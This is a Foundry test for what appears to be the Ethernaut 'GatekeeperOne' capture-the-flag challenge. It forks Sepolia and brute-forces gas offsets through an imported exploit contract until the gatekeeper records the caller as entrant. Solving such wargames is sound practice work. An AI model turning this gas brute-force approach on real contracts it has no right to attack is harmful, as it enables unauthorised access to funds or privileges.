// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 106739
import "forge-std/Test.sol";
import "../src/GatekeeperOne.sol";
import "../src/GatekeeperOneExploit.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne public gatekeeper;
    GatekeeperOneExploit public exploit;

    function setUp() public {
        // gatekeeper = new GatekeeperOne();
        // exploit = new GatekeeperOneExploit(address(gatekeeper));

        // Fork Sepolia at a specific block
        vm.createSelectFork(vm.envString("RPC_URL"));

        address gatekeeperAddress = 0x429941A90e6BB932507fd6AC20cEf04d7a85B015;
        // vm.makePersistent(gatekeeperAddress);
        gatekeeper = GatekeeperOne(gatekeeperAddress);

        exploit = new GatekeeperOneExploit(gatekeeperAddress);
    }

    function testExploit() public {
        uint256 initialGas = 100_000; // Set an initial gas guess

        // Use a specific address for tx.origin to ensure consistent behavior
        vm.startPrank(address(0x1234));
        // Brute-force the gas value to find the correct offset for gateTwo
        for (uint256 i = 0; i < 8191; i++) {
            try exploit.attack(initialGas + i) {
                // If the exploit succeeds, print the successful gas offset
                emit log_named_uint("Successful Gas Offset", initialGas + i);
                console.log("i:", i);
                assertEq(gatekeeper.entrant(), tx.origin); // Verify entrant was set
                break;
            } catch {
                // Catch errors, so the loop continues until success
            }
        }

        vm.stopPrank();
    }
}
